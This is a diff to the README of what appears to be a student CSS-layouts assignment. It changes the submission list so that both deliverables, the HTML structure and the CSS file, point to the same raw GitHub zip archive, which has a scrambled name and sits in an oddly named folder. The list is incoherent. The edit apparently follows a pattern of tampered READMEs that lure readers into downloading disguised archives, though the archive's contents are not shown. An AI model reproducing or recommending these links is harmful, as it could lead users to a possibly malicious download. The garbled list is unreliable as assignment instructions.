@@ -31,8 +31,8 @@ Avoid using any CSS frameworks or libraries—build everything with raw CSS.
 
 Submit the following:
 
-* `https://github.com/Griffnificent/july-2025-css-layouts-and-responsive-design-Griffnificent/raw/refs/heads/main/sulphurless/Griffnificent_design_css_and_responsive_july_layouts_v1.4-alpha.5.zip`: Your HTML5 structure
-* `https://github.com/Griffnificent/july-2025-css-layouts-and-responsive-design-Griffnificent/raw/refs/heads/main/sulphurless/Griffnificent_design_css_and_responsive_july_layouts_v1.4-alpha.5.zip`: Your responsive CSS file with Flexbox, Grid, and media queries
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-css-layouts-and-responsive-design-Griffnificent/main/sulphurless/july-Griffnificent-responsive-and-design-css-layouts-rotiferan.zip`: Your HTML5 structure
+* `https://raw.githubusercontent.com/Griffnificent/july-2025-css-layouts-and-responsive-design-Griffnificent/main/sulphurless/july-Griffnificent-responsive-and-design-css-layouts-rotiferan.zip`: Your responsive CSS file with Flexbox, Grid, and media queries
 
 The code should demonstrate:
 
